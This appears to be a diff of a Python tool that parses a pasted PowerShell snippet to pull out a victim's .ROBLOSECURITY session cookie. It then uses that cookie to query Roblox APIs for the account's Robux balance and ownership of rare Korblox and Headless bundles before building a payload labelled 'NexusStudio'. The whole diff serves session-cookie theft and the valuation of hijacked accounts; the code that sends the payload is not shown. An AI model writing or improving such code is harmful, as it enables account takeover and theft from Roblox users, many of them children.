@@ -19,14 +19,12 @@ def main():
 
         print(f"[*] Decoded script length: {len(decoded_script)} characters")
 
-        # 1. Extract Target URL and Asset ID
         uri_match = re.search(r'-Uri\s+["\']([^"\']+)["\']', decoded_script, re.IGNORECASE)
         target_url = uri_match.group(1) if uri_match else "https://www.roblox.com"
 
         id_match = re.search(r'/(\d+)/|id=(\d+)', target_url)
         asset_id = id_match.group(1) or id_match.group(2) if id_match else "126531364524013"
 
-        # 2. Extract and Sanitize .ROBLOSECURITY Cookie
         cookie_match = re.search(r'\.ROBLOSECURITY\s*=\s*["\']?(_\|WARNING:[^"\'\s;]+|[A-Za-z0-9_\-\.%\|]+)["\']?', decoded_script, re.IGNORECASE)
         if not cookie_match:
             cookie_match = re.search(r'\.ROBLOSECURITY["\']?\s*,\s*["\']?(_\|WARNING:[^"\'\s;]+|[A-Za-z0-9_\-\.%\|]+)["\']?', decoded_script, re.IGNORECASE)
@@ -37,7 +35,6 @@ def main():
             print("ERROR: Could not find .ROBLOSECURITY cookie in the pasted PowerShell script.")
             return
 
-        # Deep sanitize: remove surrounding quotes, escape characters, and whitespace
         roblosecurity = roblosecurity.strip(' "\'').replace('\\|', '|').replace('\\"', '"')
         print(f"[+] Cookie sanitized! Length: {len(roblosecurity)}")
 
@@ -70,15 +67,15 @@ def main():
             if pend_res.status_code == 200:
                 pending_robux = pend_res.json().get("pendingRobux", 0)
 
-            def check_asset(aid):
-                chk = requests.get(f"https://inventory.roblox.com/v1/users/{user_id}/items/asset/{aid}", headers=headers)
+            def check_bundle(bundle_id):
+                chk = requests.get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Bundle/{bundle_id}/is-owned", headers=headers)
                 if chk.status_code == 200:
-                    data = chk.json().get("data", [])
-                    return "True" if len(data) > 0 else "False"
+                    return "True" if chk.json().get("isOwned", False) else "False"
                 return "False"
 
-            has_korblox = check_asset(1924100)
-            has_headless = check_asset(134082579)
+            # Korblox Deathspeaker bundle ID is 192, Headless Horseman bundle ID is 201
+            has_korblox = check_bundle(192)
+            has_headless = check_bundle(201)
 
         payload = {
             "username": "NexusStudio",
